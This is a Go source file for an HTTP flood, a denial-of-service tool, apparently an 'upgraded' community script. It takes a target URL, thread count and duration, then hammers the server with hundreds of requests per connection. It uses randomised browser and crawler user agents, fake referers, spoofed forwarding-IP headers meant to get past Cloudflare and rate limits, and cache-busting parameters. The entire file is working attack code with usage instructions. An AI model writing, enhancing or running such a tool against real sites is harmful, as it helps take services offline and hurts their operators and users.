/*
Coded by RexxUs
Upgraded 2026 - High Pressure Edition
Same structure, way more aggressive
*/

package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	host     = ""
	port     = "80"
	page     = ""
	mode     = ""
	abcd     = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM0123456789"
	start    = make(chan bool)
	requests int64
	errors   int64

	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9,id;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
		"Accept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
	}

	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"Intel Mac OS X 10_15_7", "Intel Mac OS X 14_5", "Intel Mac OS X 15_0", "Intel Mac OS X 15_1"}
	choice3 = []string{"Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64", "Windows NT 11.0; Win64; x64"}
	choice4 = []string{"Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Linux x86_64"}
	choice5 = []string{"chrome", "firefox", "safari", "edge"}

	spider = []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	}

	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.google.com/",
		"https://www.bing.com/search?q=",
		"https://duckduckgo.com/?q=",
		"https://www.youtube.com/",
		"https://www.facebook.com/",
		"https://www.instagram.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://www.tiktok.com/",
		"https://github.com/search?q=",
		"https://news.ycombinator.com/",
		"https://www.linkedin.com/",
		"https://www.pinterest.com/search/pins/?q=",
		"https://steamcommunity.com/market/search?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else {
		os = choice4[rand.Intn(len(choice4))]
	}

	browser := choice5[rand.Intn(len(choice5))]

	switch browser {
	case "chrome":
		major := 128 + rand.Intn(6) // 128-133
		build := 1000 + rand.Intn(8000)
		patch := rand.Intn(200)
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", os, major, build, patch)
	case "firefox":
		ver := 130 + rand.Intn(6)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, ver, ver)
	case "safari":
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Safari/605.1.15", os, 1+rand.Intn(3))
	case "edge":
		major := 128 + rand.Intn(6)
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", os, major, major)
	default:
		return spider[rand.Intn(len(spider))]
	}
}

func contain(char string, x string) int {
	for i := 0; i < len(char); i++ {
		if string(char[i]) == x {
			return 1
		}
	}
	return 0
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 1+rand.Intn(223), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func bypassHeaders() string {
	ip := randomIP()
	return "X-Forwarded-For: " + ip + "\r\n" +
		"X-Real-IP: " + ip + "\r\n" +
		"X-Client-IP: " + ip + "\r\n" +
		"CF-Connecting-IP: " + ip + "\r\n" +
		"True-Client-IP: " + ip + "\r\n" +
		"X-Originating-IP: " + ip + "\r\n" +
		"X-Remote-IP: " + ip + "\r\n" +
		"X-Remote-Addr: " + ip + "\r\n" +
		"X-Forwarded-Host: " + host + "\r\n"
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = abcd[rand.Intn(len(abcd))]
	}
	return string(b)
}

func flood() {
	addr := host + ":" + port
	header := ""

	if mode == "get" {
		header += " HTTP/1.1\r\nHost: " + host + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: keep-alive\r\n"
			header += "Cache-Control: no-cache\r\n"
			header += "Pragma: no-cache\r\n"
			header += "Upgrade-Insecure-Requests: 1\r\n"
			header += "Sec-Fetch-Dest: document\r\n"
			header += "Sec-Fetch-Mode: navigate\r\n"
			header += "Sec-Fetch-Site: none\r\n"
			header += "Sec-Fetch-User: ?1\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += "Referer: " + referers[rand.Intn(len(referers))] + randString(10) + "\r\n"
			header += bypassHeaders()
		} else {
			fi, err := os.Open(os.Args[5])
			if err != nil {
				return
			}
			defer fi.Close()
			br := bufio.NewReader(fi)
			for {
				a, _, c := br.ReadLine()
				if c == io.EOF {
					break
				}
				header += string(a) + "\r\n"
			}
		}
	} else if mode == "post" {
		data := "f=" + randString(32)
		header += "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\n"
		header += "Connection: keep-alive\r\n"
		header += "Content-Type: application/x-www-form-urlencoded\r\n"
		header += "Content-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "User-Agent: " + getuseragent() + "\r\n"
		header += acceptall[rand.Intn(len(acceptall))]
		header += bypassHeaders()
		header += "\r\n" + data + "\r\n"
	}

	var s net.Conn
	var err error
	<-start

	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.DialTimeout("tcp", addr, 8*time.Second)
		}

		if err != nil {
			atomic.AddInt64(&errors, 1)
			time.Sleep(time.Millisecond * 30)
			continue
		}

		// === HEAVY PRESSURE ===
		// Send a lot more requests per connection
		for i := 0; i < 500; i++ {
			request := ""
			if mode == "get" {
				request += "GET " + page
				if contain(page, "?") == 0 {
					request += "?"
				} else {
					request += "&"
				}
				// Heavy randomization
				request += "r=" + strconv.Itoa(rand.Intn(2147483647)) +
					"&_=" + strconv.FormatInt(time.Now().UnixNano(), 10) +
					"&v=" + randString(8) +
					"&id=" + randString(6) +
					"&t=" + strconv.FormatInt(time.Now().Unix(), 10)
			}
			request += header + "\r\n"

			_, err = s.Write([]byte(request))
			if err != nil {
				break
			}
			atomic.AddInt64(&requests, 1)
		}
		s.Close()
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||           Golang 2026 - High Pressure Edition")
	fmt.Println("==========================================================================")

	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("Please input a correct url")
		os.Exit(1)
	}

	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if page == "" {
		page = "/"
	}

	if os.Args[3] != "get" && os.Args[3] != "post" {
		fmt.Println("Wrong mode, Only can use \"get\" or \"post\"")
		os.Exit(1)
	}
	mode = os.Args[3]

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
		os.Exit(1)
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
		os.Exit(1)
	}

	fmt.Printf("[+] Target  : %s\n", os.Args[1])
	fmt.Printf("[+] Threads : %d\n", threads)
	fmt.Printf("[+] Mode    : %s\n", mode)
	fmt.Printf("[+] Time    : %d seconds\n", limit)
	fmt.Println("[+] Starting High Pressure Flood...")

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 20) // even faster spawn
		go flood()
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
	}

	fmt.Println("\nFlood will end in " + os.Args[4] + " seconds.")
	close(start)

	go func() {
		for {
			time.Sleep(1 * time.Second)
			r := atomic.LoadInt64(&requests)
			e := atomic.LoadInt64(&errors)
			fmt.Printf("\r[+] Sent: %d | Errors: %d", r, e)
		}
	}()

	time.Sleep(time.Duration(limit) * time.Second)
	fmt.Printf("\n[+] Finished. Total requests: %d | Errors: %d\n",
		atomic.LoadInt64(&requests), atomic.LoadInt64(&errors))
}
